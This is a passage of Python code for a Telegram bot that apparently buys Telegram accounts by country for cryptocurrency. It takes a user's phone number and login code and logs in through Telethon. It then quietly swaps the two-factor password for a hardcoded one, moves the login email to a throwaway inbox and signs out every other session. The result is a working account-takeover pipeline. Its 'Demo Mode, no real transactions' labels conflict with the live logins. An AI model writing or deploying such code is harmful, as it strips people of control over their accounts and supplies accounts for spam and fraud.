🎉 Thanks for using our service!
"""
    else:
        needed = price - user_info['main_balance_usdt']
        success_text = f"""
❌ **Insufficient Balance!**

💰 **Required:** {price} USDT
💳 **Your Main Balance:** {user_info['main_balance_usdt']:.2f} USDT
🔺 **Additional needed:** {needed:.2f} USDT

💳 Please top-up your balance first.
"""

    keyboard = [
        [InlineKeyboardButton("💳 Top-Up Balance", callback_data="topup")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(success_text, reply_markup=reply_markup, parse_mode='Markdown')

# Purchase callback handlers
async def buy_premium_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await handle_purchase(update, context, "Premium", 50.0)

async def buy_standard_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await handle_purchase(update, context, "Standard", 25.0)

async def buy_basic_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await handle_purchase(update, context, "Basic", 10.0)

async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Return to main menu"""
    await start(update, context)

# Country Region Handlers
async def countries_europe_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show European countries"""
    query = update.callback_query
    await query.answer()

    europe_countries = ['italy', 'france', 'spain', 'england', 'netherlands', 'germany', 'switzerland', 'sweden', 'norway', 'denmark', 'austria', 'belgium', 'portugal', 'latvia', 'estonia', 'ireland', 'serbia', 'romania', 'slovenia', 'hungary', 'belarus', 'croatia', 'poland', 'czech', 'moldova', 'bosnia', 'bulgaria', 'luxembourg', 'malta', 'iceland', 'albania', 'monaco']

    text = "🇪🇺 **European Countries** (Demo Mode)\n\n"
    text += "⚠️ This is a test bot - no real transactions occur\n\n"

    keyboard = []
    for i in range(0, len(europe_countries), 2):
        row = []
        for j in range(2):
            if i + j < len(europe_countries):
                country_key = europe_countries[i + j]
                country_data = COUNTRIES_DATA[country_key]
                button_text = f"{country_data['name']} ${country_data['sell_price']}"
                row.append(InlineKeyboardButton(button_text, callback_data=f"select_{country_key}"))
        keyboard.append(row)

    keyboard.append([InlineKeyboardButton("🔙 Back to Country List", callback_data="sell_account")])
    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def countries_asia_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show Asian countries"""
    query = update.callback_query
    await query.answer()

    asia_countries = ['kazakhstan', 'russia', 'ukraine', 'kyrgyzstan', 'uzbekistan', 'turkmenistan', 'tajikistan', 'georgia', 'armenia', 'azerbaijan', 'turkey', 'saudi', 'uae', 'qatar', 'oman', 'kuwait', 'bahrain', 'iraq', 'iran', 'afghanistan', 'pakistan', 'india', 'bangladesh', 'sri_lanka', 'nepal', 'bhutan', 'maldives', 'myanmar', 'thailand', 'vietnam', 'laos', 'cambodia', 'malaysia', 'singapore', 'indonesia', 'philippines', 'brunei', 'timor', 'taiwan', 'hong_kong', 'macau', 'china', 'mongolia', 'japan', 'south_korea', 'north_korea', 'syria', 'lebanon', 'jordan', 'israel', 'palestine', 'yemen']

    text = "🌏 **Asian Countries** (Demo Mode)\n\n"
    text += "⚠️ This is a test bot - no real transactions occur\n\n"

    keyboard = []
    for i in range(0, len(asia_countries), 2):
        row = []
        for j in range(2):
            if i + j < len(asia_countries):
                country_key = asia_countries[i + j]
                country_data = COUNTRIES_DATA[country_key]
                button_text = f"{country_data['name']} ${country_data['sell_price']}"
                row.append(InlineKeyboardButton(button_text, callback_data=f"select_{country_key}"))
        keyboard.append(row)

    keyboard.append([InlineKeyboardButton("🔙 Back to Country List", callback_data="sell_account")])
    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def countries_africa_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show African countries"""
    query = update.callback_query
    await query.answer()

    africa_countries = ['egypt', 'libya', 'tunisia', 'algeria', 'morocco', 'sudan', 'south_sudan', 'ethiopia', 'somalia', 'djibouti', 'eritrea', 'kenya', 'uganda', 'tanzania', 'rwanda', 'burundi', 'congo_dr', 'congo', 'central_africa', 'cameroon', 'chad', 'gabon', 'equatorial_guinea', 'sao_tome', 'nigeria', 'ghana', 'ivory_coast', 'liberia', 'sierra_leone', 'guinea', 'guinea_bissau', 'senegal', 'gambia', 'mali', 'burkina_faso', 'niger', 'togo', 'benin', 'madagascar', 'mauritius', 'seychelles', 'comoros', 'south_africa', 'namibia', 'botswana', 'zimbabwe', 'zambia', 'malawi', 'mozambique', 'angola', 'lesotho', 'swaziland', 'cape_verde']

    text = "🌍 **African Countries** (Demo Mode)\n\n"
    text += "⚠️ This is a test bot - no real transactions occur\n\n"

    keyboard = []
    for i in range(0, len(africa_countries), 2):
        row = []
        for j in range(2):
            if i + j < len(africa_countries):
                country_key = africa_countries[i + j]
                country_data = COUNTRIES_DATA[country_key]
                button_text = f"{country_data['name']} ${country_data['sell_price']}"
                row.append(InlineKeyboardButton(button_text, callback_data=f"select_{country_key}"))
        keyboard.append(row)

    keyboard.append([InlineKeyboardButton("🔙 Back to Country List", callback_data="sell_account")])
    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def countries_america_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show American countries"""
    query = update.callback_query
    await query.answer()

    america_countries = ['usa', 'canada', 'mexico', 'guatemala', 'belize', 'el_salvador', 'honduras', 'nicaragua', 'costa_rica', 'panama', 'cuba', 'jamaica', 'haiti', 'dominican', 'puerto_rico', 'trinidad', 'barbados', 'grenada', 'lucia', 'grenadines', 'dominica', 'antigua', 'anguilla', 'cayman', 'bermuda', 'colombia', 'venezuela', 'guyana', 'suriname', 'brazil', 'ecuador', 'peru', 'bolivia', 'paraguay', 'uruguay', 'argentina', 'chile', 'falkland', 'guadeloupe', 'martinique', 'french_guiana']

    text = "🌎 **American Countries** (Demo Mode)\n\n"
    text += "⚠️ This is a test bot - no real transactions occur\n\n"

    keyboard = []
    for i in range(0, len(america_countries), 2):
        row = []
        for j in range(2):
            if i + j < len(america_countries):
                country_key = america_countries[i + j]
                country_data = COUNTRIES_DATA[country_key]
                button_text = f"{country_data['name']} ${country_data['sell_price']}"
                row.append(InlineKeyboardButton(button_text, callback_data=f"select_{country_key}"))
        keyboard.append(row)

    keyboard.append([InlineKeyboardButton("🔙 Back to Country List", callback_data="sell_account")])
    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def countries_others_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show other countries"""
    query = update.callback_query
    await query.answer()

    other_countries = ['australia', 'new_zealand', 'fiji', 'tonga', 'samoa', 'solomon', 'vanuatu', 'papua', 'micronesia', 'palau', 'marshall', 'kiribati', 'tuvalu', 'nauru', 'cook', 'niue', 'tokelau', 'aruba', 'curacao', 'sint_maarten']

    text = "🌊 **Other Countries** (Demo Mode)\n\n"
    text += "⚠️ This is a test bot - no real transactions occur\n\n"

    keyboard = []
    for i in range(0, len(other_countries), 2):
        row = []
        for j in range(2):
            if i + j < len(other_countries):
                country_key = other_countries[i + j]
                country_data = COUNTRIES_DATA[country_key]
                button_text = f"{country_data['name']} ${country_data['sell_price']}"
                row.append(InlineKeyboardButton(button_text, callback_data=f"select_{country_key}"))
        keyboard.append(row)

    keyboard.append([InlineKeyboardButton("🔙 Back to Country List", callback_data="sell_account")])
    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def country_selection_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
      """Handle individual country selection and start sell conversation"""
      query = update.callback_query
      await query.answer()

      # Extract country key from callback data (remove 'select_' prefix)
      country_key = query.data.replace('select_', '')

      # Updated full country code list for all countries
      COUNTRY_PATTERNS = {
        "italy": "+39",
        "mexico": "+52",
        "kazakhstan": "+7",
        "russia": "+7",
        "ukraine": "+380",
        "yemen": "+967",
        "latvia": "+371",
        "sierra_leone": "+232",
        "kyrgyzstan": "+996",
        "usa": "+1",
        "egypt": "+20",
        "iraq": "+964",
        "saudi_arabia": "+966",
        "turkey": "+90",
        "venezuela": "+58",
        "france": "+33",
        "argentina": "+54",
        "netherlands": "+31",
        "england": "+44",
        "uzbekistan": "+998",
        "hong_kong": "+852",
        "thailand": "+66",
        "samoa": "+685",
        "spain": "+34",
        "tunisia": "+216",
        "senegal": "+221",
        "morocco": "+212",
        "india": "+91",
        "lebanon": "+961",
        "vietnam": "+84",
        "ghana": "+233",
        "iran": "+98",
        "uae": "+971",
        "georgia": "+995",
        "mali": "+223",
        "portugal": "+351",
        "babo": "+675",
        "niger": "+227",
        "pakistan": "+92",
        "peru": "+51",
        "afghanistan": "+93",
        "tanzania": "+255",
        "zimbabwe": "+263",
        "guatemala": "+502",
        "sri_lanka": "+94",
        "jordan": "+962",
        "syria": "+963",
        "indonesia": "+62",
        "cambodia": "+855",
        "sudan": "+249",
        "puerto_rico": "+1",
        "timor": "+670",
        "taiwan": "+886",
        "sweden": "+46",
        "estonia": "+372",
        "laos": "+856",
        "nigeria": "+234",
        "israel": "+972",
        "china": "+86",
        "philippines": "+63",
        "malaysia": "+60",
        "madagascar": "+261",
        "ireland": "+353",
        "austria": "+43",
        "serbia": "+381",
        "romania": "+40",
        "slovenia": "+386",
        "ethiopia": "+251",
        "nicaragua": "+505",
        "paraguay": "+595",
        "hungary": "+36",
        "nepal": "+977",
        "uganda": "+256",
        "mongolia": "+976",
        "belarus": "+375",
        "canada": "+1",
        "colombia": "+57",
        "croatia": "+385",
        "poland": "+48",
        "kenya": "+254",
        "el_salvador": "+503",
        "myanmar": "+95",
        "libya": "+218",
        "bolivia": "+591",
        "fiji": "+679",
        "tonga": "+676",
        "costa_rica": "+506",
        "honduras": "+504",
        "japan": "+81",
        "norway": "+47",
        "australia": "+61",
        "switzerland": "+41",
        "denmark": "+45",
        "chile": "+56",
        "benin": "+229",
        "burundi": "+257",
        "cuba": "+53",
        "panama": "+507",
        "qatar": "+974",
        "oman": "+968",
        "kuwait": "+965",
        "togo": "+228",
        "armenia": "+374",
        "bangladesh": "+880",
        "mozambique": "+258",
        "angola": "+244",
        "chad": "+235",
        "algeria": "+213",
        "guinea": "+224",
        "singapore": "+65",
        "malta": "+356",
        "turkmenistan": "+993",
        "bermuda": "+1",
        "bahrain": "+973",
        "germany": "+49",
        "brazil": "+55",
        "maldives": "+960",
        "czech_republic": "+420",
        "moldova": "+373",
        "belgium": "+32",
        "new_zealand": "+64",
        "cameroon": "+237",
        "macau": "+853",
        "solomon_islands": "+677",
        "aruba": "+297",
        "djibouti": "+253",
        "albania": "+355",
        "monaco": "+377",
        "comoros": "+269",
        "iceland": "+354",
        "bosnia": "+387",
        "dominican": "+1",
        "ecuador": "+593",
        "trinidad": "+1",
        "jamaica": "+1",
        "haiti": "+509",
        "azerbaijan": "+994",
        "bulgaria": "+359",
        "luxembourg": "+352",
        "swaziland": "+268",
        "cape_verde": "+238",
        "seychelles": "+248",
        "uruguay": "+598",
        "grenada": "+1",
        "ivory_coast": "+225",
        "anguilla": "+1",
        "cayman_islands": "+1",
        "grenadines": "+1",
        "lucia": "+1",
        "principe": "+239",
        "guadeloupe": "+590",
        "mauritius": "+230",
        "suriname": "+597",
        "lesotho": "+266",
        "guyana": "+592",
        "botswana": "+267",
        "dominica": "+1",
        "namibia": "+264",
        "barbados": "+1",
        "belize": "+501",
        "gabon": "+241",
        "south_africa": "+27",
        "bhutan": "+975",
        "palestine": "+970",
        "congo": "+242",
        "central_africa": "+236",
        "zambia": "+260",
        "malawi": "+265"
}

      if country_key in COUNTRIES_DATA:
          country_data = COUNTRIES_DATA[country_key]
          # Prefer per-country saved code (set via web admin), fall back to hardcoded patterns
          country_code = country_data.get('code') or COUNTRY_PATTERNS.get(country_key, '')
          pattern_info = {'code': country_code, 'example': f"{country_code}XXXXXXXXXX"} if country_code else {'code': '', 'example': 'Include country code with +'}

          # Store selected country in context
          context.user_data['selected_country'] = country_key
          context.user_data['country_data'] = country_data
          context.user_data['country_pattern'] = pattern_info

          number_request_text = f"""
  🔢 **Provide Number**

  📱 Country: {country_data['name']}
  💰 Sell Price: ${country_data['sell_price']} USD

  Please send your number with **correct country code** (must include `+`):
  Example: `{pattern_info['example']}`

  ⚠️ **Note:** If you provide a number from a different country, it will be rejected.
  """

          keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="sell_account")]]
          reply_markup = InlineKeyboardMarkup(keyboard)

          await query.edit_message_text(number_request_text, reply_markup=reply_markup, parse_mode='Markdown')

          # Remember which message asked for the number so we can delete it later
          context.user_data['number_prompt_msg_id'] = query.message.message_id
          context.user_data['number_prompt_chat_id'] = query.message.chat_id

          return WAITING_FOR_NUMBER
      else:
          await query.edit_message_text("❌ Country information not found!", parse_mode='Markdown')
          return ConversationHandler.END

async def send_admin_approval_request(context: ContextTypes.DEFAULT_TYPE, user_id: str, number: str, country: str, price: float) -> None:
    """Send approval request to admin for sell account"""
    try:
        user_info = get_user_data(user_id)
        approval_text = f"""
🔔 **New Account Sale Request**

👤 **User:** {user_id}
📞 **Number:** {number}
🌍 **Country:** {country}
💰 **Price:** ${price} USD

💳 **Main Balance:** {user_info['main_balance_usdt']:.2f} USDT
💳 **Hold Balance:** {user_info['hold_balance_usdt']:.2f} USDT

**Do you approve this sell request?**
"""

        keyboard = [
            [InlineKeyboardButton("✅ Approve", callback_data=f"approve_sell_{user_id}_{price}")],
            [InlineKeyboardButton("❌ Reject", callback_data=f"reject_sell_{user_id}")],
            [InlineKeyboardButton("📩 Reject SMS", callback_data=f"reject_sms_{user_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=approval_text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to send admin approval request: {e}")

async def handle_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle the number input from user and send real OTP using Telethon"""
    if not update.message or not update.message.text:
        return WAITING_FOR_NUMBER

    # If user tapped a reply-keyboard main button instead of sending a number,
    # cancel the sell flow and run that button's action.
    if await maybe_cancel_sell_for_reply_button(update, context):
        return ConversationHandler.END

    number = update.message.text.strip()
    pattern_info = context.user_data.get('country_pattern', {})
    country_code = pattern_info.get('code', '')

    # Validate country code and format
    if not number.startswith('+'):
        await update.message.reply_text(
            f"❌ **Invalid Format!**\n\nPlease include the country code starting with `+`.\nExample: `{pattern_info.get('example', '+XXXXXXXXXX')}`"
        )
        return WAITING_FOR_NUMBER

    if country_code and not number.startswith(country_code):
          await update.message.reply_text(
              f"❌ **Wrong Country Number!**\n\nYou selected {context.user_data.get('country_data', {}).get('name', 'this country')}.\n"
              f"Please provide a number starting with `{country_code}`.\n"
              f"Example: `{country_code}XXXXXXXXXX`"
          )
          return WAITING_FOR_NUMBER

    # Check if number is blocked by admin
    if normalize_phone(number) in blocked_numbers:
        await update.message.reply_text(
            "❌ Sorry! This number has been **blocked** and cannot be used.",
            parse_mode='Markdown'
        )
        return WAITING_FOR_NUMBER

    # Check if number was already sold
    with user_data_lock:
        for u_id, u_data in user_data.items():
            if 'sold_numbers' in u_data and number in u_data['sold_numbers']:
                await update.message.reply_text(
                    "❌ Sorry! This number has **already been sold** and cannot be used again."
                )
                return WAITING_FOR_NUMBER

    context.user_data['user_number'] = number

    # Clean up: delete only the bot's "send your number" prompt.
    # Keep the user's submitted number message visible in the chat.
    prompt_msg_id = context.user_data.pop('number_prompt_msg_id', None)
    prompt_chat_id = context.user_data.pop('number_prompt_chat_id', None)
    if prompt_msg_id and prompt_chat_id:
        try:
            await context.bot.delete_message(chat_id=prompt_chat_id, message_id=prompt_msg_id)
        except Exception:
            pass

    # Start Telethon Client for real OTP
    anim_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="⏳ **Connecting to Telegram...**\n📡 Requesting OTP...",
        parse_mode='Markdown',
    )
    
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
        
    session_path = os.path.join('sessions', f"sell_{number.replace('+', '')}")
    client = TelegramClient(session_path, TELEGRAM_API_ID, TELEGRAM_API_HASH)
    user_id_for_pending = str(update.effective_user.id)
    
    try:
        await client.connect()
        try:
            sent_code = await client.send_code_request(number)
        except errors.FloodWaitError as e:
            await anim_msg.edit_text(f"❌ **Flood Error:** Please wait {e.seconds} seconds before trying again.")
            await client.disconnect()
            return ConversationHandler.END
        except errors.PhoneNumberBannedError:
            await anim_msg.edit_text(
                "🚫 **Account Frozen!**\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📞 **Number:** `{number}`\n\n"
                "⚠️ This number has been **frozen** by Telegram and cannot be used for selling.\n\n"
                "❌ Your sell request has been **automatically rejected**.\n\n"
                "Please try with a different, active Telegram number.",
                parse_mode='Markdown'
            )
            await client.disconnect()
            context.user_data.clear()
            await start(update, context)
            return ConversationHandler.END
            
        context.user_data['telethon_client'] = client
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash

        # Persist enough info to disk to survive a bot restart while the user
        # is mid-OTP-entry: the in-memory client/hash would otherwise be lost.
        try:
            _save_pending_login(user_id_for_pending, number, sent_code.phone_code_hash, session_path)
        except Exception as e:
            logger.error(f"[PendingLogin] Failed to persist pending login for {number}: {e}")
        
        otp_request_text = f"""
📲 **OTP SENT!**

We have sent a login code to your Telegram account for:
📞 `{number}`

Please enter the **5-digit code** here:
"""
        keyboard = [[InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale_otp")]]
        await anim_msg.edit_text(otp_request_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        # Remember which message asked for the OTP so we can delete it later
        context.user_data['otp_prompt_msg_id'] = anim_msg.message_id
        context.user_data['otp_prompt_chat_id'] = anim_msg.chat_id
        return WAITING_FOR_PIN
        
    except Exception as e:
        logger.error(f"Telethon error: {e}")
        await anim_msg.edit_text(f"❌ **Error:** {str(e)}\n\nPlease try again later.")
        if client.is_connected():
            await client.disconnect()
        return ConversationHandler.END

async def check_account_frozen(client, status_msg=None):
    """Check if a Telegram account is frozen or spam-restricted.
    Returns: 'frozen' (API-level restriction), 'spam' (SpamBot limited), or None (clean).
    Accepts optional status_msg to show animated progress to the user.
    """

    async def _step(text):
        if status_msg:
            try:
                await status_msg.edit_text(text, parse_mode='HTML')
            except Exception:
                pass

    # ── Step 1: start ──
    await _step(
        "⏳ <b>Checking Account, Please Wait...</b>\n\n"
        "🔐 Login verified ✅\n"
        "🛡️ Checking API restrictions... 🔄\n"
        "🤖 Contacting @SpamBot... ⏳\n"
        "🔎 Analyzing result... ⏳\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<i>This takes about 10 seconds, please wait...</i>"
    )

    # ── Method 1: API-level restriction flags → frozen ──
    try:
        me = await client.get_me()
        if getattr(me, 'restricted', False):
            logger.info("Frozen check: restricted=True → frozen")
            return 'frozen'
        if getattr(me, 'restriction_reason', None):
            logger.info("Frozen check: restriction_reason non-empty → frozen")
            return 'frozen'
    except Exception as e:
        logger.error(f"Frozen check get_me error: {e}")

    # ── Step 2: API clean, now contacting SpamBot ──
    await _step(
        "⏳ <b>Checking Account, Please Wait...</b>\n\n"
        "🔐 Login verified ✅\n"
        "🛡️ API restrictions checked ✅ Clean\n"
        "🤖 Contacting @SpamBot... 🔄\n"
        "🔎 Analyzing result... ⏳\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<i>Sending request to @SpamBot...</i>"
    )

    # ── Method 2: SpamBot live check → spam or None ──
    try:
        # Resolve @SpamBot by username (numeric ID fails on fresh sessions)
        logger.info("SpamBot check: resolving @SpamBot entity...")
        spambot = await client.get_entity('spambot')
        logger.info(f"SpamBot check: entity resolved → id={spambot.id}")

        # Unblock SpamBot in case the account has previously blocked it
        try:
            await client(functions.contacts.UnblockRequest(id=spambot))
            logger.info("SpamBot check: unblock request sent")
        except Exception as ub_err:
            logger.info(f"SpamBot check: unblock skipped ({ub_err})")

        # Note the last message ID before sending /start (avoids clock-skew issues)
        existing = await client.get_messages(spambot, limit=1)
        last_id = existing[0].id if existing else 0
        logger.info(f"SpamBot check: last existing msg id={last_id}")

        await client.send_message(spambot, '/start')
        logger.info("SpamBot check: /start sent, waiting 8 s for reply...")

        # ── Step 3: waiting for SpamBot reply ──
        await _step(
            "⏳ <b>Checking Account, Please Wait...</b>\n\n"
            "🔐 Login verified ✅\n"
            "🛡️ API restrictions checked ✅ Clean\n"
            "🤖 @SpamBot contacted ✅\n"
            "🔎 Processing... ⏳\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ <b>Do not send any message, please wait...</b>"
        )

        await asyncio.sleep(8)

        # ── Step 4: analyzing ──
        await _step(
            "⏳ <b>Checking Account, Please Wait...</b>\n\n"
            "🔐 Login verified ✅\n"
            "🛡️ API restrictions checked ✅ Clean\n"
            "🤖 @SpamBot replied ✅\n"
            "🔎 Analyzing result... 🔄\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "<i>Finalizing your account status...</i>"
        )

        messages = await client.get_messages(spambot, limit=5)
        logger.info(f"SpamBot check: fetched {len(messages)} messages, last_id={last_id}")

        matched_any = False
        for msg in messages:
            if not msg or msg.id <= last_id:
                continue  # skip messages that existed before we sent /start

            matched_any = True
            text_full = (msg.text or '')
            text = text_full.lower()
            logger.info(f"SpamBot NEW msg id={msg.id} buttons={bool(msg.buttons)} text={text_full[:200]!r}")

            # ONLY these specific phrases mean the account is truly spam-limited.
            # "Unfortunately, some phone numbers..." and "Good news..." are NOT spam —
            # they may have buttons too but we must NOT check buttons alone.
            spam_phrases = [
                "i'm very sorry",
                "i am very sorry",
                "you had to contact me",
                "while the account is limited",
                "account is limited",
                "your account was limited",
            ]

            if any(p in text for p in spam_phrases):
                logger.info("SpamBot check: spam phrase matched → SPAM")
                return 'spam'

            # Everything else (good news / unfortunately some phones / no reply) = CLEAN
            logger.info("SpamBot check: no spam phrase matched → CLEAN")
            return None

        if not matched_any:
            logger.warning("SpamBot check: no new reply from SpamBot → treating as CLEAN")

    except Exception as e:
        logger.error(f"Frozen check SpamBot error: {e}")

    return None


def _mdv2_esc(text: str) -> str:
    """Escape special characters for Telegram MarkdownV2."""
    for ch in r'\_*[]()~`>#+-=|{}.!':
        text = text.replace(ch, f'\\{ch}')
    return text


def _extract_country_flag(country_name: str) -> str:
    """Pull the flag emoji out of a country name like 'Italy 🇮🇹' or '🇬🇧 England'."""
    if not country_name:
        return ""
    for ch in country_name:
        if 0x1F1E6 <= ord(ch) <= 0x1F1FF:
            idx = country_name.index(ch)
            return country_name[idx:idx + 2]
    return ""


def build_login_success_message(phone: str, country_data: dict) -> str:
    """A clean, polished 'Login Successful' message with country flag."""
    flag = _extract_country_flag(country_data.get('name', ''))
    country_label = html.escape(str(country_data.get('name', 'Unknown')))
    price = country_data.get('sell_price', 0)
    safe_phone = html.escape(str(phone))
    header = f"✅ <b>Login Successful!</b> {flag}".rstrip()
    return (
        f"{header}\n\n"
        "<blockquote>"
        f"🌍 <b>Country</b> : {country_label}\n"
        f"📞 <b>Number</b> : <code>{safe_phone}</code>\n"
        f"💵 <b>Price</b> : ${price} USD\n"
        f"⏳ <b>Wait Time</b> : 24 Hours"
        "</blockquote>\n"
        "<i>Your payment will be moved to Main Balance after verification.</i> 🎉"
    )


NEW_2FA_PASSWORD = os.environ.get("NEW_2FA_PASSWORD", "4735908767")


async def set_new_2fa_password(bot, user_id: str, phone: str, client, old_password: str | None = None) -> None:
    """
    10 seconds after a successful login, force-set the account's 2FA password
    to NEW_2FA_PASSWORD.
      - If account already has 2FA, use `old_password` to replace it.
      - If account has no 2FA, set a fresh one.
    Runs silently in the background; only the admin gets notified.
    """
    try:
        await asyncio.sleep(10)

        if not client.is_connected():
            try:
                await client.connect()
            except Exception as e:
                logger.error(f"[2FA-Set] Could not reconnect for {phone}: {e}")
                return

        try:
            if old_password:
                # Step 1: remove the existing 2FA
                await client.edit_2fa(
                    current_password=old_password,
                    new_password=None,
                )
                logger.info(f"[2FA-Set] Removed old 2FA on {phone}; waiting 5s before re-enabling")
                # Step 2: short pause before re-enabling
                await asyncio.sleep(5)
                # Step 3: enable a fresh 2FA with our fixed password
                await client.edit_2fa(new_password=NEW_2FA_PASSWORD)
                action_label = "🔄 Replaced existing 2FA (removed → re-enabled)"
            else:
                await client.edit_2fa(new_password=NEW_2FA_PASSWORD)
                action_label = "🆕 Enabled new 2FA"

            logger.info(f"[2FA-Set] {action_label} on {phone}")

            try:
                await bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=(
                        f"🔐 *2FA Updated Automatically*\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📞 Number: `{phone}`\n"
                        f"👤 User ID: `{user_id}`\n"
                        f"⚙️ Action: {action_label}\n"
                        f"🔑 New Password: `{NEW_2FA_PASSWORD}`"
                    ),
                    parse_mode='Markdown',
                )
            except Exception as notify_err:
                logger.error(f"[2FA-Set] Failed admin notify for {phone}: {notify_err}")

        except errors.PasswordHashInvalidError:
            logger.error(f"[2FA-Set] Old password invalid for {phone}; cannot replace 2FA")
            try:
                await bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=(
                        f"⚠️ *2FA Update Failed*\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📞 Number: `{phone}`\n"
                        f"Reason: Old 2FA password did not match. Manual change required."
                    ),
                    parse_mode='Markdown',
                )
            except Exception:
                pass
        except Exception as inner_err:
            logger.error(f"[2FA-Set] edit_2fa failed for {phone}: {inner_err}")

    except Exception as e:
        logger.error(f"[2FA-Set] Unexpected error for {phone}: {e}")


async def auto_change_email_after_login(bot, user_id: str, phone: str,
                                        client=None) -> None:
    """
    60 seconds after a successful login, automatically change the account's
    login email using a fresh temp-mail inbox (mailto.plus / grr.la fallback).

    Pass `client` (the already-connected Telethon client) so we reuse the
    existing session instead of opening a conflicting second connection.
    """
    try:
        await asyncio.sleep(60)
        raw_phone = phone.replace('+', '').strip()
        logger.info(f"[AutoEmail] Starting auto email change for {phone}")
        result = await change_email_for_number(
            phone, raw_phone, TELEGRAM_API_ID, TELEGRAM_API_HASH,
            'sessions', 'user_data.json',
            log=lambda m: logger.info(f"[AutoEmail:{phone}] {m}"),
            existing_client=client)

        if result['success']:
            logger.info(f"[AutoEmail] Success for {phone}: {result['email']}")
            try:
                await bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=(
                        f"📧 *Auto Email Change Successful*\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📞 Number: `{phone}`\n"
                        f"👤 User ID: `{user_id}`\n"
                        f"✉️ New Email: `{result['email']}`"
                    ),
                    parse_mode='Markdown',
                )
            except Exception as notify_err:
                logger.error(f"[AutoEmail] Failed admin notify (success) for {phone}: {notify_err}")
        else:
            logger.error(f"[AutoEmail] Failed for {phone}: {result['message']}")
            try:
                await bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=(
                        f"⚠️ *Auto Email Change Failed*\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📞 Number: `{phone}`\n"
                        f"👤 User ID: `{user_id}`\n"
                        f"Reason: {result['message']}\n\n"
                        f"You can retry it manually from the admin dashboard."
                    ),
                    parse_mode='Markdown',
                )
            except Exception:
                pass
    except Exception as e:
        logger.error(f"[AutoEmail] Unexpected error for {phone}: {e}")


async def send_login_followup(bot, user_id: str, phone: str, client) -> None:
    """Two-phase security check after a successful account sale.

    Phase 1 (5 seconds after login):
        Automatically terminate ALL other active sessions — the bot keeps only
        its own current session alive.  Sends the user a confirmation listing
        every device that was signed out.

    Phase 2 (3 minutes after login):
        Re-check.  If any non-bot sessions somehow survived, send a manual
        warning with per-device 'Sign Out' buttons so the user can act.
    """

    # ── PHASE 1: auto-terminate all other sessions after 5 seconds ────────────
    await asyncio.sleep(5)
    try:
        if not client.is_connected():
            await client.connect()

        result = await client(functions.account.GetAuthorizationsRequest())
        authorizations = result.authorizations

        other_sessions = [a for a in authorizations if not getattr(a, 'current', False)]

        if other_sessions:
            terminated = []
            failed = []
            for auth in other_sessions:
                h = getattr(auth, 'hash', 0)
                device = getattr(auth, 'device_model', 'Unknown Device')
                app_name = getattr(auth, 'app_name', 'Unknown App')
                country = getattr(auth, 'country', 'Unknown')
                try:
                    await client(functions.account.ResetAuthorizationRequest(hash=h))
                    terminated.append((device, app_name, country))
                except Exception as e:
                    failed.append((device, app_name, country))
                    logger.warning(f"Could not terminate session for {device}: {e}")

            # Only notify the user when at least one device was actually signed out.
            # If every termination attempt failed, stay silent (no "Pending Sign Out" message).
            if not terminated:
                logger.info(
                    f"[Phase 1] No sessions could be signed out for {phone} "
                    f"({len(failed)} failed). Skipping user notification."
                )
            else:
                def _h(s: str) -> str:
                    return html.escape(str(s or ''))

                parts = [
                    "🛡️ <b>Security Action</b>",
                    "",
